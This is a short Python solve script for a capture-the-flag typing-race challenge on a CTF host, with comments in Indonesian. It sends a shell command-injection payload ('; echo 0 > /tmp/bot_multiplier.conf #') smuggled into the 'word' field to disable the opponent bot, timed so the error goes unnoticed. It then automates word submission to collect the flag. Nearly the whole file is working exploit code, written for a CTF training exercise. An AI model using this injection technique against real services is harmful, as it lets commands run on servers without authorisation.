import requests

BASE_URL = "http://chals1.apoorvctf.xyz:4001/api/v1"

print("[*] 1. Memulai balapan...")
res_start = requests.post(f"{BASE_URL}/race/start").json()
token = res_start['token']
race_id = res_start['race_id']
words = res_start['text'].split()
total_words = len(words)
headers = {"Authorization": f"Bearer {token}"}

print("[*] 2. Mengirim payload pelumpuh bot...")
# Sisipkan payload bersamaan dengan kata pertama agar error tidak terdeteksi
requests.post(f"{BASE_URL}/race/sync", json={
    "race_id": race_id,
    "word": f"{words[0]}; echo 0 > /tmp/bot_multiplier.conf #",
    "progress": 1 / total_words,
    "wpm": 100
}, headers=headers)

print(f"[*] 3. Mengetik {total_words} kata secara otomatis...")
for i, word in enumerate(words):
    progress = (i + 1) / total_words
    res = requests.post(f"{BASE_URL}/race/sync", json={
        "race_id": race_id,
        "word": word,
        "progress": progress,
        "wpm": 150
    }, headers=headers).json()
    
    if "flag" in res:
        print(f"\n[+] FLAG DITEMUKAN: {res['flag']}")
        break
    elif res.get("status") == "defeat":
        print("\n[-] Kalah! Bot keburu sampai finish. Coba run script ini sekali lagi.")
        break

print("[*] Selesai.")
